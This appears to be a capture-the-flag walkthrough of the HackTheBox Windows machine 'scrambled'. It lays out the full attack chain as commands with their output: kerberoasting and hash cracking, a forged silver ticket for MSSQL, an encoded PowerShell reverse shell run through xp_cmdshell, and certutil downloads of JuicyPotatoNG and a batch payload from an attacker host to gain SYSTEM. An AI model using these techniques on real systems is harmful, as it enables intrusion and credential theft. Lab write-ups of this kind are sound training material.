---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-15-scrambled-hackthebox
tags:
- hackthebox
- windows
- enumeration
- mssql
- password cracking
- kerberos
title: scrambled @ HackTheBox
---
<b> This is the unintended route.</b> <br>
scrambled is an medium-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). Initial access is gained by enumerating the website for a username, basic guessing gives us the password for this user. Using these credentials, we perform a kerberos-roast attack, cracking the service accounts password, we are able to obtain a ticket which allows us to perform a silver ticket attack. This gains internal access to the mssql service. A remote shell is obtained by abusing xp_cmdshell. Root is gain by abusing JuicyPotato.

## User & Root Flag
This post is a walkthrough for scrambled, an medium machine on [hackthebox.eu](https://www.hackthebox.eu). 
The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.248.0`) shows the following results:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 02:21:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T02:24:47+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T02:24:47+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.248.0:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-15T02:19:01
|_Not valid after:  2055-07-15T02:19:01
|_ssl-date: 2025-07-15T02:24:47+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T02:24:47+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T02:24:47+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
<SNIP>
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-15T02:24:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## User
To begin, we first enumerate the website. After some enumerating, we find a username `ksimpson` and that NTLM authentication is disabled, making this box slightly more difficult as now half our tools won't work as intended.

![capture-0](capture-0.PNG)
![capture-2](capture-2.PNG)

With some basic guessing, we find `ksimpson's` password is `ksimpson`.
A different method is using kerbrute.
![capture-3](capture-3.PNG)

We can check to see if any service accounts exist which are kerberoast-able
```
┌──(tsunami㉿coffee)-[~/Documents/scrambled]
└─$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2025-07-15 03:18:59.334852             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2025-07-15 03:18:59.334852     
```
We find that MSSQLSvc/dc1.scrm.local is roastable.
<br>
Due to a bug, we have to edit impacket slightly.
`/usr/share/doc/python3-impacket/examples/GetUserSPNs.py`
<br>Change `target = self.getMachineName()` to `target = self.__kdchost`
![capture-7](capture-7.PNG)

We can now perform a kerberos attack.
```
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request
```
`-k` tells impacket to only use kerberos as its authentication method.
![capture-8](capture-8.PNG)

Use hashcat to crack the password.
```
hashcat -m 13100 -a 0 hash.txt -w /usr/share/wordlists/rockyou.txt
```
![capture-9](capture-9.PNG)

## sqlsvc
Now we have access to the sqlsvc account, we can export the service accounts ticket locally.
```
impacket-getTGT scrm.local/sqlsvc:Pegasus60
export KRB5CCNAME=sqlsvc.ccache
```
![capture-13](capture-13.PNG)
When trying to access mssqlclient via impacket, we find it doesn't work. 
However, one attack we can do with service accounts is a silver ticket attack.
We require 3 things to perform this attack.
- SPN
- NTLM 
- SID

the SPN of the account is found earlier by enumerating the service accounts `MSSQLSvc/dc1.scrm.local`.<br>
The NTLM hash is obtained by converting the service accounts password to a NTLM hash by using: `https://www.browserling.com/tools/ntlm-hash`.<br>
![capture-10](capture-10.PNG)
the SID of the domain is obtained by running impackets getPac.
```
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
S-1-5-21-2743207045-1827831105-2542523200
```
Another way would have been ldapsearch however for unknown reasons, this did not work for me.
```
ldapsearch -H ldap://10.129.248.0 -U ksimpson -b 'DC=SCRM,DC=LOCAL'
```

With this, we have the following information to perform a silver ticket attack.
```
SPN: MSSQLSvc/dc1.scrm.local
NTLM: b999a16500b87d17ec7f2e2a68778f05
SID: S-1-5-21-2743207045-1827831105-2542523200
```

We can now perform a silver ticket attack.
```
┌──(tsunami㉿coffee)-[~/Documents/scrambled]
└─$ impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

export KRB5CCNAME=Administrator.ccache 
```
![capture-14](capture-14.PNG)

## mssql
We can now access the mssql service.
```
┌──(tsunami㉿coffee)-[~/Documents/scrambled]
└─$ impacket-mssqlclient dc1.scrm.local -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```
![capture-16](capture-16.PNG)

<b> This is the unintended route. </b>

Using the help menu, we can turn on xp_cmdshell.
Using nishang's reverse shell, we can encode it in base64 to run with powershell.<br>
`cat powershell_reverse_tcp.ps1 | iconv -t UTF-16LE | base64 -w 0
![capture-17](capture-17.PNG)
using xp_cmdshell, we can use powershell and -enc to run the base64 code.
`xp_cmdshell powershell -enc base64_payload`
![capture-18](capture-18.PNG)

## Root
Once a shell is recieved, a quick whoami /priv, we find that we have `SEimpersonatePrivileges`<br>
![capture-19](capture-19.PNG)
We can use JuicyPotato to obtain root.
<br>`https://github.com/antonioCoco/JuicyPotatoNG/releases`<br>
```
PS C:\Users\sqlsvc\Desktop> certutil -urlcache -f "http://10.10.16.2:3000/JuicyPotatoNG.exe" potato.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\sqlsvc\Desktop> .\potato.exe


         JuicyPotatoNG
         by decoder_it & splinter_code



         JuicyPotatoNG
         by decoder_it & splinter_code


Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch


Optional args: 
-l <port>: COM server listen port (Default 10247)
-a <argument>: command line argument to pass to program (default NULL)
-c <CLSID>: (Default {854A20FB-2D44-457D-992F-EF13785D2B51})
-i : Interactive Console (valid only with CreateProcessAsUser)


Additional modes: 
-b : Bruteforce all CLSIDs. !ALERT: USE ONLY FOR TESTING. About 1000 processes will be spawned!
-s : Seek for a suitable COM port not filtered by Windows Defender Firewall
PS C:\Users\sqlsvc\Desktop
```
We need to create a bat file to recieve a reverse shell, create a basic .bat file with the same encoded shell.
![capture-20](capture-20.PNG)
Download the file and run it with JuicyPotato.
```
PS C:\Users\sqlsvc\Desktop> certutil -urlcache -f "http://10.10.16.2:3000/lol.bat" lol.bat
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\sqlsvc\Desktop> .\potato.exe -t * -p C:\Users\sqlsvc\Desktop\lol.bat
```
![capture-21](capture-21.PNG)

